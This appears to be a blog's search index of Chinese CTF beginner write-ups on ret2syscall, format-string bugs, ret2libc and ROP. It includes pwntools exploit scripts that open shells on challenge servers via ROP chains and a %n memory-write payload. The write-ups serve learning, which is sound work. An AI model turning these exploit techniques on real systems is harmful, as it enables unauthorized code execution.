<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>pwn前置基础大合集</title>
      <link href="/posts/e5ae4e99.html"/>
      <url>/posts/e5ae4e99.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> pwn入门 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>reCSAPP第二章札记（更新中）</title>
      <link href="/posts/d4f00467.html"/>
      <url>/posts/d4f00467.html</url>
      
        <content type="html"><![CDATA[<h1 id="信息的表示和处理"><a href="#信息的表示和处理" class="headerlink" title="信息的表示和处理"></a>信息的表示和处理</h1><h2 id="二进制"><a href="#二进制" class="headerlink" title="二进制"></a>二进制</h2><p>起源悠久，可以追溯到埃及，印度巴拉巴拉，莱布尼茨进行了系统的发展，后由乔治·布尔进一步完善</p><p>相比十进制更容易表示，存储和传输，比如高电压表示1，低电压表示0</p><h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><p>无符号编码 大于等于零的数<br>补码 带正负号的整数<br>浮点数 </p><h1 id="信息存储和十六进制表示法"><a href="#信息存储和十六进制表示法" class="headerlink" title="信息存储和十六进制表示法"></a>信息存储和十六进制表示法</h1><p>程序将内存看成一个很大的字节数组，称为虚拟内存<br>内存的每一个字节由唯一的数字来标识，称为它的地址<br>所有地址的集合，称为虚拟内存空间</p><p>再C语言中，我们可以通过</p><p>1个字节（byte）或者说块，由8个位（bit）组成，一个位由0或1两种可能，最大是全部为1，即11111111；最小是0，即00000000。那么如果用十进制表示，最大值为255</p><p>字节作为计算机可寻址的最小单位，而并不是位</p>]]></content>
      
      
      <categories>
          
          <category> CSAPP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>初识ret2syscall</title>
      <link href="/posts/f376ffe3.html"/>
      <url>/posts/f376ffe3.html</url>
      
        <content type="html"><![CDATA[<h1 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h1><p>操作系统的进程空间可分为<strong>用户空间</strong>和<strong>内核空间</strong>，它们需要不同的执行权限。其中系统调用运行在<strong>内核空间</strong></p><p>在电脑中，系统调用（英语：system call），指运行在<strong>用户空间</strong>的程序向操作系统<strong>内核</strong>请求需要更高权限运行的服务</p><p>我们要知道，系统调用和库函数调用是两回事，系统调用由操作系统<strong>内核</strong>提供，运行于<strong>内核核心态</strong>，而普通的库函数调用由<strong>函数库或用户自己</strong>提供，运行于<strong>用户态</strong>。</p><p>应用程序调用系统调用的过程是：</p><p>1.把系统调用的编号存入EAX<br>2.把函数参数存入其它通用寄存器<br>3.触发 0x80 号中断（int 0x80）  </p><p>在这里我以32位系统为例，一个经典的系统调用如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov eax,0xb</span><br><span class="line">mov ebx,[&quot;/bin/sh&quot;]</span><br><span class="line">mov ecx,0</span><br><span class="line">mov edx,0</span><br><span class="line"></span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure><p>查找对应的函数调用表，我们知道0xb对应的是execve指令，然后将bin&#x2F;sh字符串写入寄存器ebx中，剩下几个寄存器为空。当我们触发int 0x80软中断后，CPU会切换到内核态，会先从eax读到函数调用号0xb，然后读到参数bin&#x2F;sh字符串，这一顿操作下来等价于execve(“bin&#x2F;sh”,NULL,NULL)，最后执行ret指令切换回用户态</p><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-09_10-17-34.1lc8qk07ro.webp"></p><p>系统调用表可以在以下几个网站查找<br><a href="https://rninche01.tistory.com/entry/Linux-system-call-table-%EC%A0%95%EB%A6%ACx86-x64">https://rninche01.tistory.com/entry/Linux-system-call-table-%EC%A0%95%EB%A6%ACx86-x64</a></p><p><a href="https://syscalls.mebeim.net/?table=x86/64/x64/latest">https://syscalls.mebeim.net/?table=x86/64/x64/latest</a></p><h1 id="ret2syscall实战"><a href="#ret2syscall实战" class="headerlink" title="ret2syscall实战"></a>ret2syscall实战</h1><h2 id="eg：newstar2025-week2-syscall"><a href="#eg：newstar2025-week2-syscall" class="headerlink" title="eg：newstar2025 week2 syscall"></a>eg：newstar2025 week2 syscall</h2><blockquote><p>题目内容：<br>远在Hong Kong 的朋友常说“虽然世界给他关上了门，但同时又开了一扇窗”</p></blockquote><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-09_11-11-49.2oby1htqe8.webp"></p><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-09_11-11-58.8ok4683c2n.webp"></p><p>先不管ret2syscall，我们可以看到在func函数里的是存在明显的栈溢出漏洞的，偏移量为0x12+0x4，即22</p><p>这类题有什么特征呢，打开ida，我们可以看到有茫茫多的函数，用得上用不上的都放上去了,很显然，该可执行文件是静态链接的</p><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-09_11-09-56.3yev7t997t.webp"></p><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-09_10-34-05.3yev7rzc61.webp"></p><p>这就有一个好处了，这些茫茫多的函数给我们提供了很多gadget，可以帮助我们构造ROP</p><p>从这么多gadget里手动找到我们想要的几段肯定是不现实的，我们可以用ROPgadget帮我们找</p><blockquote><p>ROPgadget –binary 文件名 –only ‘pop|ret’ | grep ‘eax’</p></blockquote><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-09_10-59-08.4ubcn95anz.webp"><br><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-09_10-59-21.361zq2f0hs.webp"></p><p>我们的四个寄存器也以此就位了，分别是</p><blockquote><p>pop_eax &#x3D; 0x080b438a<br>pop_ebx &#x3D; 0x08049022<br>pop_ecx &#x3D; 0x0804985a<br>pop_edx &#x3D; 0x0804985c</p></blockquote><p>我们还缺int80和&#x2F;bin&#x2F;sh字符串<br><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-09_11-05-25.wiz6l212x.webp"></p><p>我们找到了int80的地址</p><blockquote><p>int_0x80 &#x3D; 0x08073a00</p></blockquote><p>但是程序里没有给我们&#x2F;bin&#x2F;sh字符串。在之前的ret2libc里我们同样遇到了这种情况，我们要做的是自己sendline一个&#x2F;bin&#x2F;sh字符串，这时候我们依然可以借助系统调用，调用出read供我们使用</p><p>查询32位的系统调用表，我们知道read函数的系统调用号是0x3，关于三个参数分别是0，随便的一段.bss段，0x20，分别是什么意思可以看下面的链接，写的很详细了<br><a href="https://blog.csdn.net/m0_74091159/article/details/142261052">https://blog.csdn.net/m0_74091159/article/details/142261052</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"> </span><br><span class="line">context(arch = &#x27;i386&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br><span class="line"> </span><br><span class="line">elf = ELF(&#x27;./syscall&#x27;)</span><br><span class="line"> </span><br><span class="line">io = remote(&#x27;39.106.48.123&#x27;,26282)</span><br><span class="line"> </span><br><span class="line">#io=process(&#x27;./pwn&#x27;)</span><br><span class="line"> </span><br><span class="line">offset = 22</span><br><span class="line"> </span><br><span class="line">pop_eax = 0x080b438a</span><br><span class="line"> </span><br><span class="line">pop_ebx = 0x08049022</span><br><span class="line"> </span><br><span class="line">pop_ecx = 0x0804985a</span><br><span class="line"> </span><br><span class="line">pop_edx = 0x0804985c</span><br><span class="line"> </span><br><span class="line">int_0x80 = 0x08073a00</span><br><span class="line"> </span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line"> </span><br><span class="line">read_addr = elf.symbols[&#x27;read&#x27;]</span><br><span class="line"> </span><br><span class="line">payload = cyclic(offset)</span><br><span class="line">payload+=p32(pop_eax)</span><br><span class="line">payload+=p32(0x3)</span><br><span class="line">payload+=p32(pop_edx)</span><br><span class="line">payload+=p32(0x20)</span><br><span class="line">payload+=p32(pop_ecx)</span><br><span class="line">payload+=p32(bss_addr)</span><br><span class="line">payload+=p32(pop_ebx)</span><br><span class="line">payload+=p32(0)</span><br><span class="line">payload+=p32(int_0x80)</span><br><span class="line"></span><br><span class="line">payload+=p32(pop_eax)</span><br><span class="line">payload+=p32(0xb)</span><br><span class="line">payload+=p32(pop_edx)</span><br><span class="line">payload+=p32(0)</span><br><span class="line">payload+=p32(pop_ecx)</span><br><span class="line">payload+=p32(0)</span><br><span class="line">payload+=p32(pop_ebx)</span><br><span class="line">payload+=p32(bss_addr)</span><br><span class="line">payload+=p32(int_0x80)</span><br><span class="line"> </span><br><span class="line">io.sendlineafter(&quot;pwn it guys!\n&quot;,payload)</span><br><span class="line"> </span><br><span class="line">io.sendline(&#x27;/bin/sh\x00&#x27;)</span><br><span class="line"> </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-09_11-42-44.3uv9a4nh0o.webp"><br><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-09_11-42-54.1ziohib1ey.webp"><br><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-09_11-43-10.2oby1iykfd.webp"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>通过学习ret2syscall，我们了解了ret2syscall这类题的基本特征，重点了解了什么是系统调用，以及如何进行系统调用，对gadget和ROP技术的利用有了更加深入的理解</p>]]></content>
      
      
      <categories>
          
          <category> pwn入门 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ret2syscall </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初识格式化字符串（下）</title>
      <link href="/posts/7e846c6a.html"/>
      <url>/posts/7e846c6a.html</url>
      
        <content type="html"><![CDATA[<p>在上一篇文章中，我们了解了如何利用格式化字符串漏洞实现任意读,主要靠%d，%s等格式化占位符泄露内存。接下来介绍一下如何实现任意写，即覆盖内存</p><h1 id="开挂的-n"><a href="#开挂的-n" class="headerlink" title="开挂的%n"></a>开挂的%n</h1><p>%n是一个很牛的格式化占位符，和%d，%s等占位符不一样,它不输出字符，而是把已经成功输出的字符个数写入对应的整型指针参数所指的变量</p><p>换句话说，它会将已打印的字符个数输出至格式化参数对应的地址中</p><blockquote><p>printf(“包含%n的格式字符串”, …, &amp;变量名);</p></blockquote><p>比较特殊的是，%n对应的参数必须是一个指向整数的指针</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    int count;</span><br><span class="line"></span><br><span class="line">    printf(&quot;Hello, world!%n\n&quot;, &amp;count);</span><br><span class="line">    printf(&quot;上面那行输出了 %d 个字符。\n&quot;, count);</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果是：<br>Hello, world!<br>上面那行输出了 13 个字符。</p><p>也就是说%n统计了前面字符串的字符数，并且让count&#x3D;1</p><h1 id="利用-n覆盖内存实战"><a href="#利用-n覆盖内存实战" class="headerlink" title="利用%n覆盖内存实战"></a>利用%n覆盖内存实战</h1><p>主要分以下三个步骤：<br>1.确定覆盖地址<br>2.确定相对偏移<br>3.进行覆盖  </p><h2 id="eg2-ctfshow-pwn入门91"><a href="#eg2-ctfshow-pwn入门91" class="headerlink" title="eg2.ctfshow pwn入门91"></a>eg2.ctfshow pwn入门91</h2><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-08_19-19-22.102l3ea63n.webp"></p><p>logo函数打印了一些欢迎词，不用管。然后是ctfshow函数，下面判断了daniu的值是否等于6，如果是，那么我们就能执行system&#x2F;bin&#x2F;sh。  </p><p>我们进ctfshow函数看一下</p><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-08_19-19-44.6m4bh9bgwy.webp"></p><p>首先定义了一个大小为80的数组（缓冲区）s，memset清空重置了s的内容，有一个read函数可以往s里读入数据。重点是下面的printf函数，明显是存在格式化字符串漏洞的，再下面的printf函数可以打印出目前daniu的值</p><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-08_19-20-17.2h8q55eau9.webp"></p><p>我们看一下daniu，这里的？就说明其初始值为0，而位于.bss段则是可读可写的</p><p>下面我们的目的就是将daniu的值覆盖为6，覆盖地址确定了，下面我们来求偏移量。什么是偏移量，就是我们利用格式化字符串漏洞写入数据时，我们并不知道是从printf的第几个参数开始写的，我们这里要找到我们是从第几个参数</p><p>有以下两种方法</p><h3 id="手测"><a href="#手测" class="headerlink" title="手测"></a>手测</h3><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-08_20-09-33.6pnxezpvav.webp"></p><p>aaaa在16进制里是0x61616161，从aaaa往后数的第7个地址是0x61616161，证明我们可以在第7个参数往后读</p><p>这种方法比较无脑，但是存在一个问题是如果限制我们输入%p的数量，那就不好找偏移量了。于是就有了我们的第二个方法</p><h3 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h3><p>在pwndbg里有一个叫fmtarg的插件，可以自动帮我们计算偏移量，但是我的虚拟机里没有装这个插件，所以就不演示了，而且我个人更喜欢手测，所以如果以后遇到这种特殊情况再说</p><p>有了覆盖地址和偏移量，我们就可以进行覆盖了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io = remote (&#x27;pwn.challenge.ctf.show&#x27;,28271)</span><br><span class="line">#offset = 7</span><br><span class="line">daniu_addr = 0x0804B038</span><br><span class="line">payload = p32(daniu_addr) + b&#x27;aa%7$n&#x27;</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>我们来逐步理解一下这段payload<br>前面我们提到，%n对应的参数必须是一个指向整数的<strong>指针</strong>,也就是必须是一个<strong>地址</strong></p><p>我们前面已经测试过了，如果我们要通过read去写入字符串，是从栈上的第七个参数开始的写，因此，我们是通过read函数，daniu_addr写到了栈上的第七个参数上</p><p>然后到了第一个printf函数上，printf的第一个参数是s的第一个参数，也就是我们通过read传入的格式化字符串”\x38\xb0\x04\x08 a a %7$n”，我们需要利用的是printf函数里的%7$n这个特性，</p><p>我们可以将%7$n理解为连续7个%n，但是最终起作用的是第7个%n，很显然%7$n需要找printf的第七个参数的地址，这个时候就必须去栈里寻找，前六个参数都是我们之前说的”奇怪的数”，也就是随机从栈上或者寄存器里取的，但是到了栈空间上第七个参数的位置就不一样了，我们通过read函数将daniu_addr写进了栈空间上的第七个参数，那么%7$n就非常开心了，他就会将目标地址锁定为daniu_addr</p><p>让我们把视角拉回printf函数，%7$n前有几个字符呢，我们将daniu_addr打包成了4个字符，加上我们手动输入的两个字符的aa，这一共是6个字符，于是printf函数开始的%7$n开始发力了，它统计到它之前有6个字符，并将数值6赋给了它指向地址对应的参数，也就是让daniu&#x3D;6</p><p>特别容易混淆的是printf的参数和寄存器上的参数，他俩并不是一回事，一定要区分好。printf的一参永远是格式化字符串，read读进去的位置是寄存器的第x个参数的地址，是%x$n所取的地址，这里的x就是我们算的偏移量。</p><p>最后我们通过输出也可以看到daniu的值被改成了6<br><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-09_09-34-02.45i335g03m.webp"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>格式化字符串漏洞存在的标志比较明显，目前我们初步认识了如何利用%d，%s等读，利用%n写。下一步，格式化字符串还会发挥出什么奇效呢，让我们拭目以待</p>]]></content>
      
      
      <categories>
          
          <category> pwn入门 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 格式化字符串 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初识格式化字符串（上）</title>
      <link href="/posts/c6380b0f.html"/>
      <url>/posts/c6380b0f.html</url>
      
        <content type="html"><![CDATA[<h1 id="深入理解格式化字符串"><a href="#深入理解格式化字符串" class="headerlink" title="深入理解格式化字符串"></a>深入理解格式化字符串</h1><p>要想理解格式化字符串的原理，我们必须要知道的一个问题是，printf调用时，它的第一个参数是什么，比如<code>printf(&quot;%d %f\n&quot;, x, y);</code>，它的一参是x吗？</p><p>让我们来看看printf的声明，<code>int printf(const char *format, ...)</code>，没错，printf的一参是”%d %f\n”，即格式化字符串，这一点是很多同学都没有意识到的</p><p>我们必须要深刻理解的第二个问题是，什么是格式化字符串</p><blockquote><p>格式化字符串是一些程序设计语言的输入&#x2F;输出库中能将字符串参数转换为另一种形式输出的<strong>函数</strong>，它通过用于把随后对应的0个或多个函数参数转换为相应的格式输出；格式化字符串中转换说明以外的其它字符原样输出。我补充一点，这里的转换说明即格式化占位符。</p></blockquote><p>（ps：不要因为长就不读了，反而要读得更仔细，通过学习pwn我认识到，越涉及到一个概念的本质，描述的文字就会越详细）</p><p>通俗的说，它就是包含格式化占位符的字符串</p><h1 id="格式化字符串的工作原理"><a href="#格式化字符串的工作原理" class="headerlink" title="格式化字符串的工作原理"></a>格式化字符串的工作原理</h1><p>我们平时使用printf时，格式化占位符是必须和后面的参数一一对应的，有多少个格式化占位符，就必须有多少个参数</p><p>这里必须再说一下printf是如何调用参数的。在64位系统中，我们的参数先会按照一定的顺序被放到6个寄存器里，从第7个参数往后，参数会被放在栈里；32位系统中，参数是直接被放到栈里保存的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int a=1;</span><br><span class="line">int b=2;</span><br><span class="line">int c=3;</span><br><span class="line">printf(&quot;%d %d %d&quot;,a,b,c);</span><br><span class="line">return 0;</span><br></pre></td></tr></table></figure><p>在这段程序中，我们的参数先会按顺序被放到栈空间里保存，然后，printf会从栈空间里去找对应的数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int a=1;</span><br><span class="line">int b=2;</span><br><span class="line">int c=3;</span><br><span class="line">printf(&quot;%d %d %d&quot;,a,b);</span><br><span class="line">return 0;</span><br></pre></td></tr></table></figure><p>而我们去掉了参数c会发生什么呢</p><p>结果会是：1 2 一个很奇怪的数</p><p>因为有第三个%d的存在，printf会试图去栈或寄存器（原本c所在的位置）再取一个整数，但是显然是无法找到c的，于是就会随机地从错误的位置读取内存，就把这个奇怪的数翻了出来。这也侧面证明了printf是从栈里去寻址的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int a=1;</span><br><span class="line">int b=2;</span><br><span class="line">int c=3;</span><br><span class="line">printf(&quot;%d %d %p&quot;,a,b);</span><br><span class="line">return 0;</span><br></pre></td></tr></table></figure><p>我们把占位符改成%p，输出的结果就是c在栈上的地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">char a[]</span><br><span class="line">scanf(&quot;%s&quot;,&amp;)</span><br><span class="line">printf(a);</span><br><span class="line">return 0;</span><br></pre></td></tr></table></figure><p>更极端的情况如上</p><p>因此，我们可以利用格式化字符串实现可读可写</p><h2 id="eg1：newstar2025-week2-刻在栈上的秘密"><a href="#eg1：newstar2025-week2-刻在栈上的秘密" class="headerlink" title="eg1：newstar2025 week2 刻在栈上的秘密"></a>eg1：newstar2025 week2 刻在栈上的秘密</h2><blockquote><p>题目内容：<br>欢迎来到 x64 位餐厅！服务员 printf 先生有点健忘，他只能记住您菜单上的前 6 道菜 (RDI, RSI, RDX…)，再多就只能堆在摇摇晃晃的餐盘 (栈) 上了。更糟糕的是，他会把你写的菜单原封不动地大声念出来。你能设计一份别有用心的菜单，让他念着念着，就把秘密房间的密码念给你听吗？</p></blockquote><p>这个题没有给我们可执行文件，直接nc链接做即可</p><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-08_16-05-19.6ikpjc8t42.webp" alt="题目"></p><p>我们先输入aaaa加几个%p试一下，发现没有看到41414141，这说明aaaa被当成了格式化字符串的一部分被传入了。由于题目简单，我合理推测该prntf函数只有一个参数，即偏移量为0。不过这不重要，正常题目不会这样的</p><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-08_16-35-18.54y6fb4kh0.webp"></p><p>下面开始正式做题</p><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-08_16-41-25.6ikpjcngqj.webp"></p><p>我们可以看到，第11个%p打印出了密码所在寄存器的地址</p><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-08_17-03-18.5c1earqu49.webp"></p><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-08_17-03-24.7eh6ytpf5k.webp"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>格式化字符串漏洞的产生，就是参数和格式化占位符没有数量上的一一对应，即源代码里的格式化占位符少于参数的数量，于是我们就可以通过输入不同的格式化占位符，去打印栈空间里对应的内容</p>]]></content>
      
      
      <categories>
          
          <category> pwn入门 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 格式化字符串 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>写源代码一定要crtl+s保存啊啊啊啊啊</title>
      <link href="/posts/d4f00467.html"/>
      <url>/posts/d4f00467.html</url>
      
        <content type="html"><![CDATA[<p>今天想在css里加点东西，但是每次都是原来的样子，搞了一晚上都不行，一直是原来的样子，发现是自己改完后没有保存</p><p>看一下左下角的时间，如果是now那就证明保存了</p><p>另外，如果hexo d上传失败，可以按f12在网页里改一下，重新hexo d一下就可以了，实在不行，多等一小儿就可以了</p><p>最后，感谢我磊哥再一次救我</p>]]></content>
      
      
      <categories>
          
          <category> 碎碎念 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>梦开始的地方</title>
      <link href="/posts/1234.html"/>
      <url>/posts/1234.html</url>
      
        <content type="html"><![CDATA[<p>我的博客搭建终于好了！</p><p>从今天起，我会在我的博客上分享我的<strong>wp</strong>，以及一些<strong>CTF的日常</strong>，希望和大家一起多多交流！</p>]]></content>
      
      
      <categories>
          
          <category> 碎碎念 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>初识ret2libc</title>
      <link href="/posts/b342ee9.html"/>
      <url>/posts/b342ee9.html</url>
      
        <content type="html"><![CDATA[<p>从ret2libc开始，我们将不再局限于像ret2text那样的栈溢出了，而是要开始接触另一个技术————ROP技术。什么是ROP技术我此前详细写了博客，在此不再赘述。</p><p>ret2libc就是拿程序里已有的函数库做文章，可以ret到的plt表，或或者ret到函数实际放置的got表处</p><p>egctfshow pwn入门39&amp;41<br>这两个题思路是一样的，区别是39有bin&#x2F;sh，41有sh</p><p>首先这个题是存在明显栈溢出的，而system和sh是有但是不在一起的</p><p><img src="https://youke1.picui.cn/s1/2025/11/05/690b583a12117.png" alt="Snipaste_2025-11-05_21-59-53.png"></p><p><img src="https://youke1.picui.cn/s1/2025/11/05/690b58632beb8.png" alt="Snipaste_2025-11-05_22-00-37.png"></p><p>这段payload首先填充了buf，然后把system地址改到了返回地址，然后把system的ret用四个字节填充了。为什么要填充4个字节呢，我们知道，32位系统传参是用栈传递的，我们用call调用函数时，call会把函数的返回地址压入栈中，函数调用结束后会执行ret指令，回到返回地址处。但我们并不希望system函数返回到某处，因此将返回地址填充上所谓的“虚假地址”，而返回地址往后是system函数的一参，也是我们希望sh在的地方。因此接下来把sh写到system函数的一参，就可以执行shll了</p><p><img src="https://youke1.picui.cn/s1/2025/11/05/690b5886da79b.png" alt="Snipaste_2025-11-05_22-01-12.png"></p>]]></content>
      
      
      <categories>
          
          <category> pwn入门 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ret2libc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初识ROP</title>
      <link href="/posts/2b89d936.html"/>
      <url>/posts/2b89d936.html</url>
      
        <content type="html"><![CDATA[<p>如果遇到NX保护，即栈堆不可执行的情况，我们shellcode将不能作为机器码被执行，那么我们就需要新的方法————ROP技术。</p><p>何为ROP？ROP的全称为返回导向编程。听名字十分牛的样子。ROP的核心在返回，即ret上。ret等价于pop EIP&#x2F;RIP，call所调用的函数结束后，ret会把返回地址弹出栈，程序会跳到ret指向的地址。</p><p><img src="https://youke1.picui.cn/s1/2025/11/05/690b5571a395c.png" alt="Snipaste_2025-11-05_21-47-57.png"></p><p>出自《深入理解计算机系统（CSAPP）》第三章,要注意的一个问题是，国内外的计算机教材对于栈的画法是相反的，国外的教材更倾向于把栈倒过来画，即栈顶sp在下，栈底bp在上，栈向下增长（向下画）。不过并不影响实际的理解。</p><p>接下来我们需要知道什么是gadget。gadget在英语里的翻译是小玩意，小装置的意思，在二进制领域，gadget就是一小段程序里已经有的，通常以ret结尾的汇编代码，注意这里的关键词，“一小段”，“已有的”，“以ret结尾的”，重点是后两个词，这就意味着我们可以通过一段又一段的gadget不断ret到程序内的不同地方。就算开了NX不让我们执行shellcode，但是程序里已经有的指令总不能不让我们执行吧，这就是gadget的用处。</p><p>所以ROP就是一项通过构造一系列的gadget实现攻击的技术。</p><p>再讲一下got表和plt表是什么，这一块牵扯到静态链接和动态链接，以及延迟绑定相关的内容。延迟绑定我还没有做到涉及的题目，所以暂时按下不表。</p><p>静态链接就是把程序要用的函数，代码等直接写进了可执行文件里，在编译时加载，缺点就是文件的大小会比较大。动态链接会在程序启动时从动态链接库里调用函数，比如libc库。</p><p>PLT表（Procedure Linkage Table，过程链接表），用于支持动态链接函数调用（例如 printf, puts, system等），相当于调用外部函数时的跳板。GOT表 （Global Offset Table全局偏移表）是在运行时保存动态库函数或全局变量实际地址的表。plt表经过一段复杂的过程后，会跳转并链接到got表，这里是存储函数的真实地址，动态链接器负责把libc的地址写进got表，got表会跳转到存放函数的真实地址。</p><p>接下来我以CTFshow的pwn入门43题讲解一下ROP的使用</p><p><img src="https://youke1.picui.cn/s1/2025/11/05/690b55c3c7f30.png" alt="Snipaste_2025-11-05_21-49-22.png"></p><p>这种情况下我们需要想办法自己构造出一个bin&#x2F;sh出来，我们首先需要知道程序的哪个地方存在可读可写的段。我们gdb程序，在main函数下断点并运行，使用vmmap指令</p><p><img src="https://youke1.picui.cn/s1/2025/11/05/690b560fedca7.png" alt="Snipaste_2025-11-05_21-50-32.png"></p><p>果然.bss段里有一个buf2的变量，我们可以把bin&#x2F;sh写进去</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line"></span><br><span class="line">#io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28119)</span><br><span class="line">io = process(&quot;./pwn43&quot;)</span><br><span 